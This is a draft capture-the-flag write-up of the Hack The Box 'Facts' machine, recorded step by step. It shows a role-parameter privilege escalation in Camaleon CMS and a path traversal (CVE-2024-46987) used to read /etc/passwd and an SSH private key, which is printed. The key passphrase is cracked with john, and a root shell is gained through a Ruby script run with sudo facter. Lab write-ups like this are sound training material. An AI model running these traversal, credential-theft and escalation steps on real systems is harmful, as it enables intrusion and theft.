---
title: HTB-Facts Writeup-draft
date: 2026-02-09T17:00:00+08:00
draft: true
toc: true
images:
tags:
  - Hack
  - Writeup
  - HTB
---
> For this demonstration,the Kali IP address is 10.10.17.128.

## Initial Reconnaissance

### Nmap Port Scan

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo nmap --min-rate 10000 -p- 10.129.12.96 
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-09 04:45 EST
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Warning: 10.129.12.96 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.12.96
Host is up (0.19s latency).
Not shown: 65365 closed tcp ports (reset), 167 filtered tcp ports (no-response)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
54321/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 44.58 seconds

```

Three TCP ports are open:22,80,54321.

### Nmap Detailed Scan

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo nmap -sT -sC -sV -O -p22,80,54321 10.129.12.96
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-09 04:46 EST
Nmap scan report for 10.129.12.96
Host is up (0.13s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
80/tcp    open  http    nginx 1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/
|_http-server-header: nginx/1.26.3 (Ubuntu)
54321/tcp open  http    Golang net/http server
|_http-title: Did not follow redirect to http://10.129.12.96:9001
|_http-server-header: MinIO
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Accept-Ranges: bytes
|     Content-Length: 303
|     Content-Type: application/xml
|     Server: MinIO
|     Strict-Transport-Security: max-age=31536000; includeSubDomains
|     Vary: Origin
|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
|     X-Amz-Request-Id: 18928AF6CB3E7052
|     X-Content-Type-Options: nosniff
|     X-Xss-Protection: 1; mode=block
|     Date: Mon, 09 Feb 2026 09:46:36 GMT
|     <?xml version="1.0" encoding="UTF-8"?>
|     <Error><Code>InvalidRequest</Code><Message>Invalid Request (invalid argument)</Message><Resource>/nice ports,/Trinity.txt.bak</Resource><RequestId>18928AF6CB3E7052</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
|   GenericLines, Help, RTSPRequest, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 400 Bad Request
|     Accept-Ranges: bytes
|     Content-Length: 276
|     Content-Type: application/xml
|     Server: MinIO
|     Strict-Transport-Security: max-age=31536000; includeSubDomains
|     Vary: Origin
|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
|     X-Amz-Request-Id: 18928AF2CCDD901E
|     X-Content-Type-Options: nosniff
|     X-Xss-Protection: 1; mode=block
|     Date: Mon, 09 Feb 2026 09:46:18 GMT
|     <?xml version="1.0" encoding="UTF-8"?>
|     <Error><Code>InvalidRequest</Code><Message>Invalid Request (invalid argument)</Message><Resource>/</Resource><RequestId>18928AF2CCDD901E</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Vary: Origin
|     Date: Mon, 09 Feb 2026 09:46:19 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port54321-TCP:V=7.95%I=7%D=2/9%Time=6989ACE9%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,2B0,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nAcc
SF:ept-Ranges:\x20bytes\r\nContent-Length:\x20276\r\nContent-Type:\x20appl
SF:ication/xml\r\nServer:\x20MinIO\r\nStrict-Transport-Security:\x20max-ag
SF:e=31536000;\x20includeSubDomains\r\nVary:\x20Origin\r\nX-Amz-Id-2:\x20d
SF:d9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8\r\nX-Am
SF:z-Request-Id:\x2018928AF2CCDD901E\r\nX-Content-Type-Options:\x20nosniff
SF:\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20Mon,\x2009\x20Feb
SF:\x202026\x2009:46:18\x20GMT\r\n\r\n<\?xml\x20version=\"1\.0\"\x20encodi
SF:ng=\"UTF-8\"\?>\n<Error><Code>InvalidRequest</Code><Message>Invalid\x20
SF:Request\x20\(invalid\x20argument\)</Message><Resource>/</Resource><Requ
SF:estId>18928AF2CCDD901E</RequestId><HostId>dd9025bab4ad464b049177c95eb6e
SF:bf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>")%r(HTTPOptions,59
SF:,"HTTP/1\.0\x20200\x20OK\r\nVary:\x20Origin\r\nDate:\x20Mon,\x2009\x20F
SF:eb\x202026\x2009:46:19\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPR
SF:equest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
SF:quest")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\
SF:x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20B
SF:ad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\
SF:r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20clos
SF:e\r\n\r\n400\x20Bad\x20Request")%r(FourOhFourRequest,2CB,"HTTP/1\.0\x20
SF:400\x20Bad\x20Request\r\nAccept-Ranges:\x20bytes\r\nContent-Length:\x20
SF:303\r\nContent-Type:\x20application/xml\r\nServer:\x20MinIO\r\nStrict-T
SF:ransport-Security:\x20max-age=31536000;\x20includeSubDomains\r\nVary:\x
SF:20Origin\r\nX-Amz-Id-2:\x20dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9
SF:251148b658df7ac2e3e8\r\nX-Amz-Request-Id:\x2018928AF6CB3E7052\r\nX-Cont
SF:ent-Type-Options:\x20nosniff\r\nX-Xss-Protection:\x201;\x20mode=block\r
SF:\nDate:\x20Mon,\x2009\x20Feb\x202026\x2009:46:36\x20GMT\r\n\r\n<\?xml\x
SF:20version=\"1\.0\"\x20encoding=\"UTF-8\"\?>\n<Error><Code>InvalidReques
SF:t</Code><Message>Invalid\x20Request\x20\(invalid\x20argument\)</Message
SF:><Resource>/nice\x20ports,/Trinity\.txt\.bak</Resource><RequestId>18928
SF:AF6CB3E7052</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd
SF:1af9251148b658df7ac2e3e8</HostId></Error>");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.98 seconds
```

Prioritize penetration testing on port 80.
## Web Penetration

Visiting port 80 reveals a redirecte to `facts.htb`. Added this to `hosts` file.

![](Pasted%20image%2020260209174832.png)

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo vim /etc/hosts

┌──(kali㉿kali)-[~/Work/Kali]
└─$ tail -n 1 /etc/hosts              
10.129.12.96    facts.htb
```

Upon revisiting and browsing the basic content of the website, no obvious vulnerabilities were found.

![](Pasted%20image%2020260209175053.png)

### Directory Brute-forcing and Privilege Escalation

Performing directory brute-forcing revealed the backend login URL: `admin`.

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo gobuster dir -u http://facts.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://facts.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 11113]
/search               (Status: 200) [Size: 19187]
/rss                  (Status: 200) [Size: 183]
/sitemap              (Status: 200) [Size: 3508]
/en                   (Status: 200) [Size: 11109]
/page                 (Status: 200) [Size: 19593]
/welcome              (Status: 200) [Size: 11966]
/admin                (Status: 302) [Size: 0] [--> http://facts.htb/admin/login]
/post                 (Status: 200) [Size: 11308]
/ajax                 (Status: 200) [Size: 0]
/Index                (Status: 200) [Size: 11113]
Progress: 717 / 220561 (0.33%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 731 / 220561 (0.33%)
[ERROR] context canceled
===============================================================
Finished
===============================================================
```

Visiting `admin` revealed that user registration is enable.

![](Pasted%20image%2020260209175343.png)

Registered a user and logged in.

![](Pasted%20image%2020260209175431.png)

Entering the backend, a brief overview reveals this is a `Camaleon CMS` system, version is 2.9.0.

![](Pasted%20image%2020260209175451.png)

On the `Profile` page, personal information can be modified. Notably, the `ID` and `Role` balues are fixed.

![](Pasted%20image%2020260209175555.png)

Here are some findings regarding the `name` attributes for the personal information fields.

![](Pasted%20image%2020260209175811.png)

![](Pasted%20image%2020260209175904.png)

![](Pasted%20image%2020260209175919.png)

Used `Burp Suite` to capture the password change request for further analysis.

```bash
POST /admin/users/5/updated_ajax HTTP/1.1

Host: facts.htb

Content-Length: 190

X-CSRF-Token: wmdjew05iS50IPFTpEktXiUMZ2mavTgtJF_PiGxgVWAjcv9INpE9nUFI36h07ef5wDo5Ji7BoxUuNo6uP1VHLQ

X-Requested-With: XMLHttpRequest

Accept-Language: en-US,en;q=0.9

Accept: */*

Content-Type: application/x-www-form-urlencoded; charset=UTF-8

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36

Origin: http://facts.htb

Referer: http://facts.htb/admin/profile/edit

Accept-Encoding: gzip, deflate, br

Cookie: auth_token=d4tflPzld32u-QKn6gSF5A&Mozilla%2F5.0+%28X11%3B+Linux+x86_64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F136.0.0.0+Safari%2F537.36&10.10.17.128; _factsapp_session=XYgzITY62BFC457B0tZ7lqbnOrS2Ve9LXd%2FG5rf%2FQG7TSzeEBdifYmDA1nqd5cDWV6W3BFnGvu6lXP7qeIDi9vHoNQl8pvK1UVd0fECUz9JFQn0LL6ynprsE%2BgjKo%2FILHECcrG8j9MPh0zcvUj6Xg8dXs9NU9qTvlp5su3WmUrxwILGKxsedZ89UDvv7TBe3PqKDpsN1QlfRm61pPcyw4Lx%2FPe0AemKQtajVEZupS0Mo6G5vEvDLb1CbwW%2FE3d8s6TuFTaXKDckzUjicJJUBwNVagzDhFaNrkaP5qdYmCjWQNUC2XLxOHgt3vL3zf9YogELJbd8%3D--Q1%2Fme1HVJWBDvcxq--bYe%2Fc3%2FKtb%2BLZKLkLxmSBg%3D%3D

Connection: keep-alive



_method=patch&authenticity_token=wmdjew05iS50IPFTpEktXiUMZ2mavTgtJF_PiGxgVWAjcv9INpE9nUFI36h07ef5wDo5Ji7BoxUuNo6uP1VHLQ&password%5Bpassword%5D=admin&password%5Bpassword_confirmation%5D=admin
```

The password modification fields match those found. on the parameter `password[role]=admin` during a password change can lead to privilege escalation. Attempted to modify the request and re-login.

![](Pasted%20image%2020260209180359.png)

gained full access to the backend system; this was verified by switching to `admin` in the `User` interface.

![](Pasted%20image%2020260209180459.png)

Further research revealed that `Camaleon CMS` is vulnerable to [CVE-2024-46987](https://rubysec.com/advisories/CVE-2024-46987/) , which allows for directory traversal and arbitrary file reading.

Accessed the URL `http://facts.htb/admin/media/download_private_file?file=../../../../../../etc/passwd` to download the `passwd` file.

```passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
usbmux:x:100:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:102:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:103:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:104:104::/nonexistent:/usr/sbin/nologin
uuidd:x:105:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:106:107::/nonexistent:/usr/sbin/nologin
tss:x:107:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
_laurel:x:101:988::/var/log/laurel:/bin/false
```

The users with a `bash` environment are `trivia` and `william`. Accessed `http://facts.htb/admin/media/download_private_file?file=../../../../../../home/trivia/id_ed25519` to attempt downloading their `id_rsa` files.

```id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDPFoJGv5
iCd2KL8Mk98VRJAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIIJhikYx00CYMUNJ
bkfs15NSAgTKVW07Aw2N4nxQ/RZ6AAAAoAj0NoVnW97AXPxNpphTUEKgehTfW3KWvX/9ps
AvdkbwNKeW1F/CkRpsFkmcc1/cvTrzBueLfuJI/2Cm8RB55xHgkJNtkk9Fc3HLRF8Z/kZC
Mn8NP3Z2qOuHzSO5yoqU2mFiFBouc56nWkR50JElA2z0L65KU81xDPB3YVujEf/yxbvoxJ
ElX+bGho7xDsCOubcJxarL+rGEZ5DQTxpAjGk=
-----END OPENSSH PRIVATE KEY-----
```

It is worth nothing that downloading `id_rsa` failed; it was necessary to download `id_ed25519` instead. `id_ed25519` is the private key file for the modern Ed25519 algorithm recommended for SSH.

Rename `id_ed25519` to `id_rsa` and saved it locally.

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ ls
id_ed25519

┌──(kali㉿kali)-[~/Work/Kali]
└─$ mv id_ed25519 id_rsa                     

┌──(kali㉿kali)-[~/Work/Kali]
└─$ ls
id_rsa
```

Used `john` to crack the hash generated by `ssh2john`.

```bash
──(kali㉿kali)-[~/Work/Kali]
└─$ ssh2john id_rsa | tee 'key_hash'
id_rsa:$sshng$6$16$cf168246bf988277628bf0c93df15449$290$6f70656e7373682d6b65792d7631000000000a6165733235362d637472000000066263727970740000001800000010cf168246bf988277628bf0c93df154490000001800000001000000330000000b7373682d656432353531390000002082618a4631d340983143496e47ecd793520204ca556d3b030d8de27c50fd167a000000a008f43685675bdec05cfc4da698535042a07a14df5b7296bd7ffda6c02f7646f034a796d45fc2911a6c16499c735fdcbd3af306e78b7ee248ff60a6f11079e711e090936d924f457371cb445f19fe4642327f0d3f7676a8eb87cd23b9ca8a94da6162141a2e739ea75a4479d09125036cf42fae4a53cd710cf077615ba311fff2c5bbe8c491255fe6c6868ef10ec08eb9b709c5aacbfab1846790d04f1a408c69$24$130

┌──(kali㉿kali)-[~/Work/Kali]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt key_hash 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 24 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
dragonballz      (id_rsa)     
1g 0:00:00:51 DONE (2026-02-09 05:18) 0.01947g/s 62.30p/s 62.30c/s 62.30C/s billy1..imissu
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

## Linux Privilege Escalation

Logged in as `trivia` using the `id_rsa` key.

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ chmod 600 id_rsa   

┌──(kali㉿kali)-[~/Work/Kali]
└─$ ssh -i id_rsa trivia@10.129.12.96
Enter passphrase for key 'id_rsa': 
Last login: Wed Jan 28 16:17:19 UTC 2026 from 10.10.14.4 on ssh 
Welcome to Ubuntu 25.04 (GNU/Linux 6.14.0-37-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon Feb  9 10:21:32 AM UTC 2026

  System load:           0.0
  Usage of /:            71.8% of 7.28GB
  Memory usage:          17%
  Swap usage:            0%
  Processes:             222
  Users logged in:       1
  IPv4 address for eth0: 10.129.12.96
  IPv6 address for eth0: dead:beef::250:56ff:feb9:fefe


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
trivia@facts:~$ whoami
trivia
```

Enumerating via `sudo -l` revealed that `facter` can be run with `sudo` privileges without a password.

```bash
trivia@facts:~$ sudo -l
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

Wrote a Ruby script for privilege escalation in the `/tmp` directory.

```bash
trivia@facts:/tmp/Enil$ cat >Enil.rb<< 'EOF'
> #!/usr/bin/env ruby
> puts "custom_fact=Enil"
> system("chmod +s /bin/bash")
> EOF
trivia@facts:/tmp/Enil$ cat Enil.rb 
#!/usr/bin/env ruby
puts "custom_fact=Enil"
system("chmod +s /bin/bash")
```

Executed `facter` with `sudo` to trigger the script, then Launched a SUID shell.

```bash
trivia@facts:/tmp/Enil$ sudo /usr/bin/facter --custom-dir=/tmp/Enil x
custom_fact=Enil

trivia@facts:/tmp/Enil$ ls -liah /bin/bash
523 -rwsr-sr-x 1 root root 1.7M Mar  5  2025 /bin/bash
trivia@facts:/tmp/Enil$ /bin/bash -p
bash-5.2# whoami
root
```